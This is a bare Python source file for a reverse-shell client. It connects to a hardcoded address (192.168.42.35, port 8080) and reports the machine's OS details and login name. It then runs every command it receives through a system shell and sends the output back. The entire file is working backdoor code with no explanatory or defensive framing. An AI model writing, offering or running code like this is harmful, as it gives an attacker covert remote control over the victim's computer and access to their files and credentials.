import socket
import sys
import subprocess
import os
import gnureadline


def get_info():
    info = ""

    for x in os.uname():
        info += x + ','
    info += os.getlogin()

    return info


def send_data(conn, data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)


def shell(conn):

    while True:
        try:
            command = str(conn.recv(1024))
        except socket.error:
            break

        splited_command = command.split(' ')

        if splited_command[0].lower() == '$':

            if splited_command[1].lower() == 'cd':
                try:
                    os.chdir(splited_command[2])
                except OSError as e:
                    send_data(conn, '[ERROR] ' + e[1])
                    continue

            res = 1
            msg = ''

            while len(splited_command) > res:
                msg += splited_command[res] + ' '
                res += 1

            CMD = subprocess.Popen(msg, shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE
                                   )
            stdout, stderr = CMD.communicate()
            result = str(stdout) + str(stderr)
            send_data(conn, result)

        elif command.lower() == 'get_pwd':
            send_data(conn, os.getcwd())
            continue

        elif command.lower() == 'exit()':
            conn.close()
            break

        else:
            send_data(conn, '[ERROR] Unknown command')


def connect():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.42.35", 8080))
        s.send(get_info())
        shell(s)
        s.close()

    except socket.error:
        sys.exit(1)


def main():
    connect()


if __name__ == '__main__':
    main()
